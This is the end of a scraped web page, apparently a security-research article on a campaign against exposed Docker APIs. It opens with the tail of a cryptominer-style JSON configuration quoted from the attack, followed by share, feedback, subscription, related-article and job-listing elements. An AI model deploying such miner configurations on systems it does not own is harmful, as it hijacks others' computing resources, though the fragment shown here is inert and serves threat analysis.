            <span class="token property">"socks5"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"self-select"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"submit-to-origin"</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token property">"print-time"</span><span class="token operator">:</span> <span class="token number">60</span><span class="token punctuation">,</span>
    <span class="token property">"health-print-time"</span><span class="token operator">:</span> <span class="token number">60</span><span class="token punctuation">,</span>
    <span class="token property">"dmi"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token property">"retries"</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
    <span class="token property">"retry-pause"</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
    <span class="token property">"syslog"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token property">"tls"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"protocols"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"cert"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"cert_key"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"ciphers"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"ciphersuites"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"dhparam"</span><span class="token operator">:</span> <span class="token null keyword">null</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"user-agent"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
    <span class="token property">"verbose"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token property">"watch"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token property">"pause-on-battery"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token property">"pause-on-active"</span><span class="token operator">:</span> <span class="token boolean">false</span>
<span class="token punctuation">}</span></code></pre>


        
      </div>

      <span class="block pb-7 tablet:pb-9 desktop:pb-12"></span>

      

      <div>
        <div class="share-article">
  <ul class="flex gap-3 desktop:gap-4">
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fattackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis%2F&amp;text=Attackers%20deploying%20new%20tactics%20in%20campaign%20targeting%20exposed%20Docker%20APIs" title="twitter" data-custom-name="Social link">
          <svg class="fill-blue-1 hover:fill-blue-2 active:fill-blue-1"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="20" cy="20" r="20"/>
<g clip-path="url(#clip0_37_5902)">
<path d="M32.9092 13.3016C32.01 13.693 31.0567 13.9458 30.0817 14.0513C31.1112 13.4379 31.8818 12.4703 32.2492 11.3299C31.2957 11.9088 30.2509 12.322 29.1592 12.5519C28.486 11.8187 27.6064 11.3066 26.6363 11.083C25.6662 10.8594 24.6511 10.9347 23.7247 11.2991C22.7983 11.6636 22.004 12.2999 21.4465 13.1245C20.8891 13.949 20.5945 14.9229 20.6017 15.9181C20.6016 16.2966 20.6444 16.6738 20.7292 17.0427C18.7718 16.9435 16.8571 16.4344 15.109 15.5484C13.361 14.6625 11.8185 13.4194 10.5817 11.8996C10.142 12.6499 9.91154 13.5042 9.91418 14.3737C9.90958 15.1884 10.1072 15.9916 10.4894 16.7112C10.8716 17.4309 11.4265 18.0445 12.1042 18.4971C11.3153 18.4784 10.5429 18.2674 9.85418 17.8823V17.9423C9.85385 19.0784 10.2464 20.1797 10.9654 21.0596C11.6843 21.9395 12.6855 22.5439 13.7992 22.7705C13.3763 22.8854 12.9399 22.9433 12.5017 22.9429C12.192 22.9434 11.883 22.9133 11.5792 22.8529C11.8923 23.8314 12.5041 24.6872 13.3287 25.3003C14.1532 25.9135 15.1492 26.2531 16.1767 26.2716C14.4307 27.64 12.2753 28.3819 10.0567 28.3783C9.67264 28.3676 9.28951 28.3351 8.90918 28.2808C11.1581 29.7303 13.7784 30.4983 16.4542 30.4925C25.5142 30.4925 30.4642 22.9954 30.4642 16.4879C30.4642 16.278 30.4642 16.0605 30.4642 15.8506C31.4253 15.1541 32.2534 14.2907 32.9092 13.3016Z" fill="white"/>
</g>
<defs>
<clipPath id="clip0_37_5902">
<rect width="24" height="19.5" fill="white" transform="translate(10 11)"/>
</clipPath>
</defs>
</svg>

          <span class="sr-only">twitter</span>
        </a>
      </li>
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fattackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis%2F" title="reddit" data-custom-name="Social link">
          <svg class="fill-orange-3 hover:fill-orange-4 active:fill-orange-3"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M20 40C31.0457 40 40 31.0457 40 20C40 8.95431 31.0457 0 20 0C8.95431 0 0 8.95431 0 20C0 31.0457 8.95431 40 20 40Z"/>
<path d="M33.3304 20.0001C33.3318 19.4272 33.1645 18.8666 32.8493 18.3882C32.5341 17.9099 32.085 17.5349 31.558 17.3103C31.031 17.0856 30.4495 17.0211 29.8861 17.1249C29.3227 17.2287 28.8024 17.4961 28.39 17.8938C26.3985 16.4569 23.651 15.5278 20.5899 15.4202L21.9192 9.16929L26.2604 10.0914C26.2837 10.5985 26.4911 11.0797 26.8438 11.4447C27.1966 11.8098 27.6703 12.0336 28.1764 12.0743C28.6824 12.115 29.1858 11.9697 29.5923 11.6656C29.9988 11.3616 30.2805 10.9197 30.3844 10.4228C30.4883 9.92592 30.4075 9.40819 30.1569 8.96669C29.9064 8.52519 29.5034 8.19025 29.0235 8.02468C28.5436 7.85911 28.0199 7.87427 27.5504 8.06733C27.0809 8.26039 26.6979 8.61809 26.4734 9.07334L21.6267 8.04128C21.4914 8.01286 21.3503 8.03928 21.2345 8.11475C21.1186 8.19022 21.0375 8.30856 21.0088 8.44381L19.5251 15.4178C16.4195 15.5044 13.6299 16.4358 11.6103 17.8892C11.3036 17.5961 10.9366 17.3735 10.5349 17.2369C10.1332 17.1004 9.70661 17.0533 9.28482 17.0987C8.86303 17.1442 8.45627 17.2813 8.09295 17.5003C7.72963 17.7193 7.41853 18.0151 7.18137 18.3668C6.94422 18.7186 6.78674 19.1179 6.71994 19.5368C6.65314 19.9557 6.67863 20.3842 6.79463 20.7923C6.91063 21.2003 7.11434 21.5782 7.39153 21.8993C7.66871 22.2205 8.01268 22.4772 8.39941 22.6516C8.35065 22.9425 8.32406 23.2367 8.31984 23.5316C8.31984 28.0202 13.5433 31.657 19.9885 31.657C26.4336 31.657 31.6547 28.0202 31.6547 23.5316C31.6545 23.2385 31.6318 22.9459 31.5869 22.6563C32.1032 22.4296 32.5427 22.058 32.8522 21.5865C33.1616 21.1151 33.3277 20.564 33.3304 20.0001ZM13.3327 22.0829C13.3322 21.6704 13.4542 21.267 13.683 20.9238C13.9118 20.5806 14.2373 20.313 14.6183 20.1548C14.9993 19.9966 15.4186 19.955 15.8233 20.0352C16.2279 20.1154 16.5997 20.3138 16.8915 20.6053C17.1834 20.8968 17.3822 21.2684 17.4628 21.6729C17.5435 22.0775 17.5023 22.4969 17.3446 22.878C17.1868 23.2592 16.9196 23.585 16.5766 23.8142C16.2337 24.0434 15.8304 24.1658 15.4179 24.1658C14.8655 24.1652 14.3358 23.9456 13.945 23.5552C13.5541 23.1648 13.3339 22.6354 13.3327 22.0829ZM24.9498 27.5896C23.5293 29.0078 20.8029 29.1201 20.0025 29.1201C19.2021 29.1201 16.4757 29.0078 15.0552 27.5896C14.9537 27.4881 14.8967 27.3505 14.8967 27.207C14.8967 27.0635 14.9537 26.9258 15.0552 26.8243C15.1566 26.7229 15.2943 26.6658 15.4378 26.6658C15.5813 26.6658 15.7189 26.7229 15.8204 26.8243C16.7168 27.7207 18.6288 28.0389 20.0025 28.0389C21.3762 28.0389 23.2906 27.7207 24.1869 26.8243C24.2365 26.7714 24.2963 26.7291 24.3626 26.6998C24.4289 26.6704 24.5005 26.6548 24.573 26.6537C24.6455 26.6526 24.7175 26.666 24.7847 26.6933C24.8518 26.7206 24.9128 26.7612 24.964 26.8125C25.0152 26.8639 25.0556 26.925 25.0827 26.9923C25.1098 27.0595 25.123 27.1316 25.1217 27.2041C25.1204 27.2766 25.1045 27.3481 25.075 27.4143C25.0454 27.4805 25.0029 27.5402 24.9498 27.5896ZM24.5848 24.1681C24.1722 24.1686 23.7687 24.0466 23.4254 23.8177C23.0821 23.5887 22.8145 23.2631 22.6564 22.882C22.4983 22.5009 22.4568 22.0814 22.5372 21.6767C22.6176 21.272 22.8162 20.9002 23.108 20.6085C23.3997 20.3167 23.7715 20.1181 24.1762 20.0377C24.5809 19.9573 25.0004 19.9988 25.3815 20.1569C25.7626 20.315 26.0882 20.5827 26.3172 20.9259C26.5461 21.2692 26.6681 21.6727 26.6676 22.0853C26.6664 22.6373 26.4465 23.1664 26.0562 23.5567C25.6658 23.947 25.1368 24.1669 24.5848 24.1681Z" fill="white"/>
</svg>

          <span class="sr-only">reddit</span>
        </a>
      </li>
    
  </ul>
</div>
      </div>
    </div>

    <span class="block desktop:hidden pb-9 tablet:pb-7 desktop:pb-0"></span>

    <div id="feedback-card-sticky" class="col-span-12 desktop:w-4/12 desktop:pr-10">
      <div
    x-data="{ activeButton: 0, cardVisible: true }"
    x-show="cardVisible"
    class="article-feedback-card card z-10 p-3 tablet:p-4 desktop:p-6 w-full flex flex-col tablet:flex-row desktop:flex-col gap-3 tablet:gap-6 desktop:gap-3 justify-between">
    <div class="flex gap-5 desktop:gap-4 items-center justify-between">
        <h2 class="text-purple-3 italic font-national font-light text-16 leading-24 tablet:text-18 tablet:leading-26 desktop:text-20 desktop:leading-28">
            Did you find this article helpful?
        </h2>

        <button class="flex" type="button" aria-label="Close feedback prompt" @click="cardVisible = false">
            <svg class="inline-flex tablet:hidden desktop:inline-flex w-6 h-6 fill-gray-40 hover:fill-purple"  focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"/>
</svg>

        </button>
    </div>

    <div class="flex gap-6 items-center">
        <div class="grid grid-cols-2 gap-4 w-fit">
            
    <button
    
        data-custom-name="Article thumbs up"
        aria-label="Article thumbs up"
    
    class="feedback-button group/button inline-flex w-fit p-1.5 rounded border-[2px] active:border-purple-3 active:bg-purple-3"
    :class="activeButton === 1 ? 'border-purple-3 bg-purple-3' : 'border-gray-25 hover:border-purple hover:bg-purple'"
    type="button"
    @click="activeButton = 1"
    :disabled="activeButton === 1 ? true : false">
    <svg class="inline-flex w-6 h-6 group-active/button:fill-white" :class="activeButton === 1 ? 'fill-white' : 'fill-black'" focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_1110_10289)">
<path d="M23.05 7.275C22.6625 6.7875 22.0875 6.5 21.475 6.5H14.7875L15.7875 2.4875C15.9375 1.8875 15.8 1.2625 15.425 0.775C15.0375 0.2875 14.4625 0 13.85 0H10.9875C10.2375 0 9.5625 0.4125 9.2125 1.075L6.3875 6.5H1.5V20.5H6H8H18.975C19.9 20.5 20.6875 19.875 20.9125 18.9875L23.4125 8.9875C23.5625 8.3875 23.425 7.7625 23.05 7.275ZM6 18.5H3.5V8.5H6V18.5ZM21.475 8.5L18.975 18.5H8V7.75L10.9875 2H13.85L12.225 8.5H21.475Z"/>
</g>
<defs>
<clipPath id="clip0_1110_10289">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>
</svg>

</button>

            
    <button
    
        data-custom-name="Article thumbs down"
        aria-label="Article thumbs down"
    
    class="feedback-button group/button inline-flex w-fit p-1.5 rounded border-[2px] active:border-purple-3 active:bg-purple-3"
    :class="activeButton === 2 ? 'border-purple-3 bg-purple-3' : 'border-gray-25 hover:border-purple hover:bg-purple'"
    type="button"
    @click="activeButton = 2"
    :disabled="activeButton === 2 ? true : false">
    <svg class="inline-flex w-6 h-6 group-active/button:fill-white" :class="activeButton === 2 ? 'fill-white' : 'fill-black'" focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M0.949947 16.725C1.33745 17.2125 1.91245 17.5 2.52495 17.5H9.21245L8.21245 21.5125C8.06245 22.1125 8.19995 22.7375 8.57495 23.225C8.96245 23.7125 9.53745 24 10.1499 24H13.0124C13.7624 24 14.4374 23.5875 14.7874 22.925L17.5999 17.5H22.4999V3.5H17.9999H15.9999H5.02495C4.09995 3.5 3.31245 4.125 3.08745 5.0125L0.587447 15.0125C0.437447 15.6125 0.574947 16.2375 0.949947 16.725ZM17.9999 5.5H20.4999V15.5H17.9999V5.5ZM2.52495 15.5L5.02495 5.5H15.9999V16.25L13.0124 22H10.1499L11.7749 15.5H2.52495Z"/>
</svg>

</button>

        </div>

        <button class="hidden tablet:flex desktop:hidden" type="button" aria-label="Close feedback prompt" @click="cardVisible = false">
            <svg class="inline-flex w-6 h-6 fill-gray-40 hover:fill-purple"  focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"/>
</svg>

        </button>
    </div>
</div>
    </div>
  </article>

  <div class="py-18 tablet:py-24 desktop:py-30">
    <section id="subscribe" class="scroll-mt-20">
    <div class="card-subscription">
        <div>
            <h2 class="tracking-[-0.01em] text-24 leading-24 tablet:text-28 tablet:leading-28 desktop:text-[34px] desktop:leading-[34px]">
                Subscribe to the Datadog Security Digest</h2>
            <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>
            <p class="">Get Security Labs posts, insights from the cloud security community, and the latest Datadog security features delivered to your inbox monthly. No spam.</p>
        </div>
        <div>
            <form
                id="mktoForm_32364"
                data-redirect="false"
                class="relative flex flex-col gap-2 tablet:gap-3 desktop:gap-4 [&>div:has([type=hidden])]:hidden
                    [&_input]:proportional-nums [&_input]:placeholder:text-gray-5 [&_input]:border [&_input]:border-gray-40 [&_input]:rounded
                    [&_input]:w-full [&_input]:px-3 [&_input]:py-1.5 [&_input]:focus-within:outline-gray-40 [&_input]:text-16
                    [&_input]:leading-24 [&_input]:tablet:text-18 [&_input]:tablet:leading-26 [&_input]:desktop:text-20
                    [&_input]:desktop:leading-28 [&_p:has(span)]:text-14 [&_p:has(span)]:leading-20 [&_p:has(span)]:desktop:text-16
                    [&_p:has(span)]:desktop:leading-22 [&_label]:hidden [&_button]:bg-transparent [&_button]:text-magenta
                    [&_button]:font-extrabold [&_button]:uppercase [&_button]:text-14 [&_button]:leading-18 [&_button]:tablet:text-16
                    [&_button]:tablet:leading-20 [&_button]:desktop:text-18 [&_button]:desktop:leading-24 [&_button]:tracking-[0.01em]
                    [&_button]:w-max [&_button]:px-2 [&_button]:tablet:px-3 [&_button]:desktop:px-4 [&_button]:absolute [&_button]:right-0
                    [&_button]:top-[9px] [&_button]:tablet:top-2 [&_a]:text-purple-600 [&_a:hover]:text-purple [&_.mktoErrorMsg]:text-gray-5"></form>
            <div id="mktoForm_32364--thank-you" class="hidden">
                <h3>Thank you for subscribing!</h3>
            </div>
        </div>
    </div>
</section>

    <script src="/assets/scripts/lp/js/forms2/js/forms2.min.js"></script>

<script src="/assets/scripts/marketo_form-KCMD5SGW.js" defer></script>

  </div>

  
  

  
    <section>
      <h2 class="h1">Related Content</h1>

      <span class="block pb-4 tablet:pb-5 desktop:pb-6"></span>

      <div class="grid grid-cols-1 tablet:grid-cols-3 gap-6 tablet:gap-[30px]">
        
          
            <a class="block text-black" href="/articles/a-guide-to-threat-hunting-and-monitoring-in-snowflake/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?auto=format&amp;w=447&dpr=1.75"
        alt="A guide to threat hunting and monitoring in Snowflake"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">emerging threats and vulnerabilities</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">A guide to threat hunting and monitoring in Snowflake</p>
  </article>
</a>
          
        
          
        
          
            <a class="block text-black" href="/articles/confluence-rce-vulnerability-overview-and-remediation/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_cloud.png?auto=format&amp;w=447&dpr=1.75"
        alt="The Confluence RCE vulnerability (CVE-2022-26134): Overview, detection, and remediation"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">emerging threats and vulnerabilities</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">The Confluence RCE vulnerability (CVE-2022-26134): Overview, detection, and remediation</p>
  </article>
</a>
          
        
          
            <a class="block text-black" href="/articles/confluence-vulnerability-cve-2023-22515-overview-and-remediation/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/emergingvuln_hero_explode.png?auto=format&amp;w=447&dpr=1.75"
        alt="The Confluence CVE-2023-22515 vulnerability: Overview, detection, and remediation"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">emerging threats and vulnerabilities</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">The Confluence CVE-2023-22515 vulnerability: Overview, detection, and remediation</p>
  </article>
</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </div>
    </section>
  
</div>

<div class="border-t border-gray-800"></div>
<section id="work-with-us">
  <div class="work-with-us container desktop:py-15 tablet:py-12 py-9">
    <h2 class="h1 capitalize">work with us</h2>

    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="desktop:text-28 desktop:leading-32 tablet:text-24 tablet:leading-28 text-20 leading-24">
      We're always looking for talented people to collaborate with
    </p>

    <span class="block pb-6 tablet:pb-8 desktop:pb-12"></span>

    <div>
      <p class="font-extrabold desktop:text-16 desktop:leading-20 text-14 leading-18 uppercase">
        featured positions
      </p>

      <span class="block pb-2 desktop:pb-3"></span>

      <ul class="border-t border-gray-15">
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6262025/?gh_jid=6262025">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Director, Engineering - Observability SRE
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6164747/?gh_jid=6164747">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Engineering Manager 1 - Trust &amp; Safety
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6288119/?gh_jid=6288119">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Engineering Manager - Incident Management
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5912132/?gh_jid=5912132">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Information Security Analyst II, Customer Trust
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5912135/?gh_jid=5912135">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Information Security Analyst II, Customer Trust (Lisbon)
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6105990/?gh_jid=6105990">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Product Threat Detection Engineer 2
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </div>

    <span class="block pb-6 tablet:pb-8 desktop:pb-12"></span>

    <p class="desktop:text-28 desktop:leading-32 tablet:text-24 tablet:leading-28 text-20 leading-24">
      We have <span class="text-purple-3">19</span> positions
    </p>

    <span class="block pb-4 tablet:pb-5 desktop:pb-6"></span>

    
 
<a
  href="https://careers.datadoghq.com/all-jobs/?parent_department_Engineering%5B0%5D=Engineering&amp;child_department_Engineering%5B0%5D=Global%20Information%20Security"
  data-custom-name="View all positions button"
>
  <span class="btn-default border-default">view all</span>
</a>


  </div>
</section>

<script src="/assets/scripts/article-MQSRUAET.js" defer></script>
<script type="module" async>import mermaid from "https://unpkg.com/mermaid@10/dist/mermaid.esm.min.mjs";document.addEventListener('DOMContentLoaded', mermaid.initialize({"loadOnSave":true}));</script>

    </main>
    
    

<footer class="navbar navbar-footer">
  <div class="container h-full flex tablet:flex-nowrap flex-wrap justify-between tablet:items-center">
    <p class="copyright tablet:-order-none order-2">&copy; Datadog 2024</p>
    <nav class="navbar-menu tablet:order-none order-1 tablet:w-auto w-full tablet:m-0 mb-5">
      <ul>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/terms/" title="TERMS" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">TERMS</span>
    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/privacy/" title="PRIVACY" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">PRIVACY</span>
    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/cookies/" title="COOKIES" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">COOKIES</span>
    
  </a>
</li>
        
      </ul>
    </nav>
    <nav class="navbar-menu tablet:order-none order-3">
      <ul class="flex items-center gap-5">
        
          <li class="navbar-menu-item navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3 ">
  <a href="https://www.twitter.com/datadoghq/" title="twitter" class="navbar-menu-link" data-custom-name="Social link">
    <span class="sr-only">twitter</span>
    
      <svg class="navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3"  width="32" height="26" viewBox="0 0 32 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M32 3.06847C30.8011 3.59032 29.53 3.92736 28.23 4.06809C29.6028 3.25017 30.6302 1.96012 31.12 0.439486C29.8487 1.21147 28.4556 1.7624 27 2.06886C26.1024 1.09132 24.9296 0.408504 23.6362 0.11034C22.3427 -0.187824 20.9892 -0.0873454 19.754 0.398541C18.5188 0.884427 17.4598 1.73293 16.7165 2.83228C15.9732 3.93163 15.5804 5.23027 15.59 6.55713C15.5899 7.06175 15.6469 7.56476 15.76 8.05656C13.1501 7.92429 10.5972 7.24554 8.26644 6.06426C5.9357 4.88298 3.87916 3.22551 2.23 1.19919C1.64381 2.19953 1.33648 3.33861 1.34 4.49792C1.33386 5.58425 1.5974 6.65514 2.10701 7.61464C2.61661 8.57415 3.35637 9.3923 4.26 9.99581C3.20814 9.97087 2.1783 9.68949 1.26 9.17613V9.25609C1.25956 10.7709 1.78297 12.2393 2.74158 13.4125C3.70019 14.5857 5.03504 15.3916 6.52 15.6936C5.95613 15.8468 5.37433 15.9241 4.79 15.9235C4.37705 15.9242 3.96504 15.884 3.56 15.8036C3.97753 17.1081 4.79325 18.2493 5.89266 19.0668C6.99208 19.8843 8.31998 20.3372 9.69 20.3618C7.36206 22.1863 4.48815 23.1756 1.53 23.1707C1.01794 23.1565 0.507113 23.1132 0 23.0408C2.9985 24.9733 6.49229 25.9975 10.06 25.9897C22.14 25.9897 28.74 15.9935 28.74 7.31684C28.74 7.03695 28.74 6.74706 28.74 6.46717C30.0214 5.53848 31.1256 4.38732 32 3.06847Z"/>
</svg>

    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3 ">
  <a href="/rss/feed.xml" title="rss" class="navbar-menu-link" data-custom-name="Social link">
    <span class="sr-only">rss</span>
    
      <svg class="navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3"  version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 192 192" style="enable-background:new 0 0 192 192;" xml:space="preserve">
  <path class="st0" d="M136,154h-16c0-45.21-36.79-82-82-82V56C92.04,56,136,99.96,136,154z"/>
  <path class="st0" d="M96,154H80c0-23.16-18.84-42-42-42V96C69.98,96,96,122.02,96,154z"/>
